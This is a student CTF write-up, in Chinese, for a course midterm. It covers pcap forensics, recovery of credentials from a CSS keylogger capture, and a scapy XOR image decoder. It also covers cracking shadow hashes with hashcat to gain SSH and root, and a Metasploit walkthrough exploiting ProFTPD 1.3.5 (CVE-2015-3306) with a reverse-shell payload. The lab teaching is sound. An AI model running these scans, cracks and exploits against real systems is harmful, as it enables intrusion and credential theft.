# HTCF Midterm

![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/monkey_flag.png)

Auther: **stavhaygn**

Writeup By: **yctseng1227**

## Scoreboard
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/scoreboard.png)

## Forensics

### images 0x1 (100 points, 23 solves)
#### Description

images~ images~ images~

> hint: flag在圖片裡

[pcap file](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/images_0x1.pcap)

#### Solution

> 聽說不少人用 NetworkMiner 這軟體解得乾淨俐落（？）
> 不過考試當下封包數量不多就沒想這麼多，因此個人作法比叫偏手工

用 wireshark 開啟 .pcap 後，用 `Follow > TCP Stream`看大概只有 10 包 stream，其中不乏出現 .png 的 header 如圖。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/01.png)

這部分可以用 `File > Export Objects > HTTP...` 把指定的檔案 dump 出來（重點是 multipart/form-data）。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/02.png)


可以直接用 save all 把檔案存起來，然後用 hex editor 根據 [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) 的 header 把圖片的修好。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/03.png)

圖片修完就看得到 Flag 了!!

### CSS-Keylogger (150 points, 8 solves)

#### Description
有趣的CSS Keylogger文章：

[CSS keylogger：攻擊與防禦](https://blog.techbridge.cc/2018/03/02/css-key-logger/)

[Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)

嘗試在封包中分析此次的CSS Keylogger攻擊與受害者c7f網站上的信箱與密碼，並且嘗試登入

> hint: 運氣好或靠實力拿到小遊戲中的flag吧

網站連結 http://c7f.macacahub.tw/login

[pcap file](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/CSS_Keylogger.pcap)

#### Solution

題目給了兩篇關於 CSS Keylogger 的文章，算是課外補充。

如果認真對網站進行研究會發現該網站被駭入後，CSS Keylogger 寫在 `bootstrap.min.css` 內（不知道這個也解的出來啦 XD）。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/01.png)

從網站 source code 可以看得出來登入會驗證信箱格式、以及密碼會加鹽再 Hash，因此不用期待能把封包內撈到的 Hash 拿去爆破密碼。

從.pcap封包檔的 `Follow > TCP Stream` 可以觀察到如文章所提的 CSS Keylogger 帶出的參數。

![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/02.png)

其中前面的 `/e/` 表示 email、`/p/` 表示password，也算一種小提示。

總之整理前面所觀察到的封包特徵，可以用 filter 簡單過濾出來（當然用 TCP Stream 慢慢點也是可以）。

> http && ip.dst == 45.79.159.73

![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/03.png)

這樣就能拿到三組帳號，再來就是有點運氣的嘗試登入... 沒錯，會這麼說是因為我拿到帳密戳了半小時都沒成功，最後要放棄時就莫名其妙登入了XDDDDDD 

事後和助教討論也沒得到個明確結果，如果有想法歡迎找我們討論QQ

登入後... 抓猴子囉!!
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/04.gif)

基本上五隻猴子只有一隻點得到Flag，如果不想慢慢用滑鼠點的話可以縮小視窗把他們關起來，或是直接開 source code 找連結拿 Flag !!
![](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/05.png)



### images 0x2 (250 points, 1 solve)

#### Description
小朋友才只用工具解題目，大朋友都寫code

[pcap file](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/images_0x2.pcap)

#### Solution

這題看起來沒有什麼特殊情境，就是很刻意的希望同學用 coding 解決問題XD

基本作法和 [駭客攻防 hw_0x01 Writeup](https://blog.eevee.tw/2020/201104-htcf-hw1-writeup/) 差不多，只是要還原的東西不太一樣。

封包題起手式一樣 `Follow > TCP Stream`，看到封包內容有 `xor_key`、`image` 那就是要把圖片 XOR 還原出來了，方向應該是不難猜，只是在往後看可以發現有多達100個圖片，所以還是乖乖寫扣ㄅ。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/01.png)

順帶一提、`xor_key` 是用 base64 混淆過，就算 Decode 還原出來也是難以辨識的字串，助教存心不給人手動驗證（雖然圖片好像也很難手工還原就是...）。

scapy 的教學參考上面連結就不再贅述，不過要注意的是撈 Raw 欄位的資料會有兩種情況（如圖），推測是封包太長被截成兩段QQ ，條件判斷上可以根據封包長度或是判斷資料內容是否有關鍵字。最後，我們關心的重點在 `xor_key`、`image` 還有 ... 檔名!! 寫完就知道了XD
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/02.png)

由於資料全部都串在一起，處理上有些麻煩... `xor_key` 和 `image` 可以用 `\r\n` 切出來，但 filename 就只能用 [Regular Expression](https://regex101.com/) 篩出來，不然就是用指定位址的方式（因為圖片長度其實都相同 XD），剩下看扣應該不難懂：）

```python=
from scapy.all import *
import re
import base64

pkts = rdpcap('images_0x2.pcap')
for p in pkts:
    if IP in p and p[IP].dst == '140.117.169.219':
        if Raw in p and b'filename' in p[Raw].load:
            raw = p[Raw].load

            filename = re.search(b'filename="(\w*.\w*)"', raw)
            filename = filename.group(1).decode('utf-8')

            xor_key = base64.b64decode(raw.split(b'\r\n')[3])
            ciphertext = raw.split(b'\r\n')[7]

            # 用 mod 的方式重複 padding xor_key
            res = [ word ^ xor_key[idx % len(xor_key)] for idx, word in enumerate(ciphertext) ]

            img = open(filename, 'wb')
            img.write(bytes(res))
            img.close()
```

成功把所有圖片 dump 出來，會發現有分兩種檔名，分別是 0-27 還有 時間戳記，剩下就是慢慢拼 Flag 了!!
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/03.png)


## Pwn 

### hashmeow (120 points, 2 solves)
#### Description

macacahub.tw 又多開了一個 port 提供 ssh

你想要進來拿flag嗎？

想要的話可以全部給你... 去找吧！我把所有的帳密都放在檔案裡了

> hint 1: 檔案從該提供ssh服務的主機掉出來的
> hint 2: 10k-most-common.txt 不錯用
> hint 3: port_number > 1000 && port_number != 8778 && port_number != htcf.ports.port_number
> hint 4: flag在linux某個權限為1777的神奇目錄下
> hint 5: 運氣也是種實力

#### Solution

如果有寫過 htcf 的練習題應該知道掃 port 的起手式就是 nmap，掃描查看 Domain 底下開了哪些 port 的服務 (其中 `-p-` 等同 `-p 0-65535`)。

```shell
nmap -p- macacahub.tw
nmap -sV -p 55555 macacahub.tw
```

根據 hint 3 ，我們可以知道目標 port 是 55555，再進一步利用 `-sV` 查到是 ssh 服務（hint 1），結果如下。

![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/01.png)

找到連線入口，接下來我們需要 ssh 連線的帳號密碼。

從題目給的 passwd 和 shadow 其實就是存放密碼的檔案，只不過是被 Hash 過的 (可參考 [相關文章](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)），如果想知道更細節內容可以去翻 [鳥哥的私房菜](http://linux.vbird.org/linux_basic/0410accountmanager.php)，總之這裡我們需要想辦法把密碼爆破出來!!
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/03.png)


根據 hint 2，可以找到字典檔 [10k-most-common.txt](https://github.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt) 並下載至本機端。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/02.png)

再來就是用 `hashcat` 這個密碼還原工具，題目的 hashmeow 其實就是在暗示這個，可參考 hashcat 相關文章，要注意的是 shadow 內的 $6$ 是指 SHA-512，指令要對應到 `-m 1800`，另外結尾要掛上 `--show` 不然會沒有結果（笑），針對 shadow 使用 hashcat 可以找到兩組密碼，分別是 root:root 和 shelly:shelly，真的是**弱密碼**欸... 其實就是 hint 5 的部分。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/04.png)

接著就是要嘗試用 shelly 的帳號登入（平常並不會有人直接用 root 登入，雖然這題預設也鎖 root 登入）。
最後就是在裡頭找 Flag 啦，根據 hint 4，可以 Google 發現 1777 權限分數其實指的就是 `/tmp` 目錄，細節同樣可參考 [鳥哥私房菜](http://linux.vbird.org/linux_basic_train/unit05.php)，進到 `/tmp` 找到 secret 資料夾後輕鬆拿 Flag。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/05.png)



### hashmeow root (50 points, 1 solve)
#### Description

與hashmeow同題目

但是flag在root的家裡

#### Solution

承接上題的作法，分數比較低的原因是 Flag 單純放不同資料夾而已 XD

回到根目錄`/`，並且根據提示移動到 root 目錄會發現權限不足，就連 `sudo` 也不能用QQ 不過有一招基本的提權方式是 `sudo su`，那我們可以從 `bin` 目錄找到 `su` 並且直接執行，被要求輸入的root密碼就是我們剛剛透過 hashcat 爆出來的 root:root，提權!!!

剩下就只是回 `/root`，拿 Flag !!

![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/06.png)


### ProFTPD (120 points, 0 solve)
#### Description
區網中有一個FTP伺服器，好像有漏洞來著(網路遮罩255.255.255.0，不是 xxx.xxx.xxx.1那台主機)

請先ssh遠端連線至攻擊用主機(同CTF平台初始的帳號密碼) 接著在攻擊機的區網中找出有漏洞的主機 

並且exploit有漏洞的主機 最後取得"/var/www/html/_backup"目錄下的flag檔

ssh -p 8778 {你的帳號}@macacahub.tw

> hint: 建議修改預設LPORT

#### Solution

登入"攻擊用主機"後，根據題目描述要從區網中找出有漏洞的主機（也提示 FTP Server），先找到目前主機的 IP ，再透過 nmap 掃區網。
以本題為例，IP 為 172.30.0.3，則區網掃描可以用 `172.30.0.0/24` 或是 `172.30.0.*`，先確認 FTP 主機存在再查看版本細項，暴力一點可以直接用 `nmap -A 172.30.0.0/24` 一次把細節全部列出來。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/01.png)

可以找到該 FTP Server 的版本為 `ProFTPD 1.3.5`，可以從 Google 發現有漏洞編號 **CVE-2015-3306**，那就是用上課所學的 Metasploit Framework 嘗試針對這個漏洞進行攻擊。 ...沒錯!! 現在登入的這台"攻擊用主機"已經把你把相關工具都裝好了，可以直接下 `msfconsole` 來找關於漏洞相關的工具，如果懶得從 Google 找漏洞編號，也可以直接在 msf 搜尋 `ProFTPD 1.3.5` 相關攻擊工具。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/02.png)

剩下就是工具使用，如果有寫課堂作業應該知道基本的操作方式..吧XD

參數的設定上 RHOST 目標IP為 nmap 掃出來的 172.30.0.2，SITEPATH 為題目描述的 `/var/www/html/`，這題還需要設定 payloads... 而且並不是每一組 payload 都能成功需要一點運氣，不過數量也不多把 payload 全部戳一遍也蠻快der。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/03.png)


設定完 payload 後記得要再確認一次 options，把 LHOST 補上"攻擊用主機"，以便打過去的 reverse shell 才能順利彈回來，若攻擊成功就能拿到 FTP Server 的 shell，剩下就是把 flag 撈出來，結束。
![ ](https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/04.png)



```shell
$ ifconfig #查看當前主機ip: 172.30.0.3
$ nmap 172.30.0.0/24 #掃區網，找到 FTP 主機(ip 172.30.0.2, port 21)
$ nmap -sV -p 21 172.30.0.2 #查看剛主機細部資訊，發現是ProFTPD 1.3.5


$ msfconsole
msf5 > search ProFTPD 1.3.5
msf5 > use unix/ftp/proftpd_modcopy_exec
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show options
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOST <target_ip>
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH <target_directory>
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show payloads
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set set payload cmd/unix/reverse_perl

msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show options
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST <localhost_ip>
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > exploit

(reverse shell)
ls 
ls _backup
cat _backup/f1aaag.txt
```




